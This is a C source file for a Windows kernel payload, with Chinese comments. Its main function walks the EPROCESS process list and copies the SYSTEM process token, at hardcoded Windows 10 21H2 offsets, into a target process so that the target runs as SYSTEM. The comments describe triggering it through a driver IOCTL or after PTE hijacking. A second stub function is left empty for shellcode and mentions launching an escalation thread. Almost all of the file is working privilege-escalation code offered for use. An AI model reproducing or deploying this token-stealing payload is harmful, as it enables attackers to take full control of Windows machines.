/*
 * kernel_payload.c
 * 这里放置你希望被R3跳转执行的内核代码
 *
 * 关键约束（因为是从 R3 call 过来的，CPU 仍在 Ring-3 模式！）：
 *   - CPU 特权级 = 3，不能执行 IN/OUT/LIDT 等特权指令
 *   - 但代码物理页是内核页，地址空间映射是内核只读区域被重映射
 *   - 若想真正提权到 Ring-0，需要结合 syscall/sysenter 或利用内核调用链
 *
 * 若目标是：在内核上下文（IOCTL/DPC/APC）中执行，由内核 call 该函数指针
 * 则可以直接使用所有内核 API，下面是这种用法的示例
 */

#include "Common.h"

/*
 * 示例 Payload：在内核上下文中执行，提升进程 Token 至 System
 * 通过遍历 EPROCESS 链表找到 PID=4(System) 的 Token，复制到目标进程
 *
 * 调用方式：内核驱动 IOCTL 处理中 call KernelPayload_ElevateToken(PsGetCurrentProcess())
 */
NTSTATUS KernelPayload_ElevateToken(_In_ PEPROCESS TargetProcess)
{
    NTSTATUS status = STATUS_NOT_FOUND;

    // 在 Win10 x64 上 EPROCESS 偏移（需按版本调整）
    // Token offset = 0x4B8 (Win10 21H2)
    // ActiveProcessLinks offset = 0x448
    // UniqueProcessId offset = 0x440
    const ULONG TOKEN_OFFSET       = 0x4B8;
    const ULONG ACTIVE_LINKS_OFFSET = 0x448;
    const ULONG PID_OFFSET         = 0x440;

    ULONG_PTR systemToken = 0;

    // 遍历 EPROCESS 链表找 System 进程 (PID=4)
    PEPROCESS curProc = PsGetCurrentProcess();
    PLIST_ENTRY head = (PLIST_ENTRY)((PUCHAR)curProc + ACTIVE_LINKS_OFFSET);
    PLIST_ENTRY entry = head->Flink;

    while (entry != head)
    {
        PEPROCESS proc = (PEPROCESS)((PUCHAR)entry - ACTIVE_LINKS_OFFSET);
        HANDLE pid = *(PHANDLE)((PUCHAR)proc + PID_OFFSET);

        if ((ULONG_PTR)pid == 4) // System PID
        {
            // 读取 System 的 Token（低4位为引用计数相关标志，需清零）
            systemToken = *(PULONG_PTR)((PUCHAR)proc + TOKEN_OFFSET);
            systemToken &= ~0xFULL; // 清低4位
            break;
        }
        entry = entry->Flink;
    }

    if (!systemToken)
    {
        DBG("Payload: System EPROCESS not found");
        return STATUS_NOT_FOUND;
    }

    // 将 System Token 写入目标进程
    PULONG_PTR pTargetToken = (PULONG_PTR)((PUCHAR)TargetProcess + TOKEN_OFFSET);
    *pTargetToken = systemToken;

    DBG("Payload: Token elevated to SYSTEM: 0x%llX", systemToken);
    return STATUS_SUCCESS;
}

/*
 * 另一种用法：供 PTE 劫持后 R3 直接 call 的裸函数
 * 注意：此时 CPU 仍在 Ring-3，只是代码来自内核物理页
 * 函数内只能做用户态允许的操作（或利用 syscall 陷入内核）
 */
__declspec(noinline)
VOID KernelPayload_UserCallable(VOID)
{
    // 这里演示：通过 syscall 触发自定义内核服务
    // 实际使用时填充你的 shellcode 逻辑
    //
    // 示例：用 NtWriteVirtualMemory syscall 写入目标内存
    // 或者：用 NtCreateThreadEx 启动一个提权线程
    __nop();
    __nop();
    return;
}
